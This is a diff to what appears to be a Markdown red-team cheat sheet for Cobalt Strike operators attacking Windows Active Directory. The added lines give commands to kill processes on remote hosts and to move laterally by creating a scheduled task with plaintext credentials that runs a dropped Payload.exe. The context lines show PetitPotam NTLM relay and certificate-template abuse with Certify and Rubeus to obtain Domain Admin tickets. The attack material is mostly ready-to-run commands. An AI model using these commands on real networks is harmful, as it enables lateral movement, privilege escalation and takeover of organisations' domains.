@@ -75,6 +75,21 @@ run nltest /dclist:domain.com
 # Get domain trusts
 run nltest /trusted_domains
 ```
+
+## Miscellaneous Remote Workstation/Server stuff
+
+List and kill processes on remote system (requires local Admin)
+- Using tasklist.exe and taskkill.exe <br />
+```
+run tasklist /s SERVER.domain.com --> List remote processes
+run taskkill /s SERVER.domain.com /IM PROCESS.exe --> Kill remote process
+```
+- Using [CIMplant](https://github.com/FortyNorthSecurity/CIMplant) <br />
+```
+execute-assembly CIMplant.exe -s [remote-IP-address] -c ps --> List remote processes
+execute-assembly CIMplant.exe -s [remote-IP-address] -c process_kill <ProcessName/PID> --> Kill remote process
+```
+
 -----------------------------------------------------------------------------------------
 ## Local Privilege Escalation
 
@@ -201,6 +216,15 @@ powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-jumpbox.lab.
 # Now we can move laterally in CS with WinRM for the specified user
 make_token AD\testuser password
 jump [winrm/winrm64] ops-jumpbox.lab.com HTTPSLISTENER
+```
+
+Scheduled task lateral movement
+```
+# First copy payload files to remote system manually
+# Create task on remote system
+run schtasks /create /tn "MyTask" /sc once /U DOMAIN\username /P Password1! /S target-host.domain.com /tr "cmd.exe /c C:\Windows\temp\Payload.exe"
+# Execute remote task
+run schtasks /run /tn "MyTask" /S target-host.domain.com
 ```
 
 [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PS tools to perform SMB and WMI pass-the-hash attacks
@@ -333,7 +357,7 @@ run PetitPotam.exe <Kali-Listener-IP> <DC-IP>
 
 # NTLM relay output will have base64 ticket of target DC machine account
 # Use Rubeus to request TGT of DC machine account to esclate to Domain Admin
-execute-assembly Rubeus.exe asktgt /dc:<DC-IP> /domain:domain.com /user:<DC-Machine-account>$ /ptt /certificate:<base64-ticket-from-output>
+execute-assembly C:\Rubeus.exe asktgt /dc:<DC-IP> /domain:domain.com /user:<DC-Machine-account>$ /ptt /certificate:<base64-ticket-from-output>
 
 # Verify asktgt command worked by doing an 'ls' command on the DC
 ls \\<DC-IP>\c$
@@ -428,7 +452,7 @@ execute-assembly C:\Certify.exe find /vulnerable /domain:lab.com
 # Request a new certificate for a vulnerable template from the above output 
 execute-assembly C:\Certify.exe request /ca:lab.com\ops-dc01 /template:VulnTemplate /altname:DomainAdminUser1
 
-# Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus.exe
+# Copy the certificate private key from the above output to a file, then request a TGT using the certificate file with Rubeus
 execute-assembly C:\Rubeus.exe asktgt /user:DomainAdminUser1 /certificate:C:\Temp\cert.pfx /domain:lab.com
 ```
 ------------------------------------------------------------------------------------------
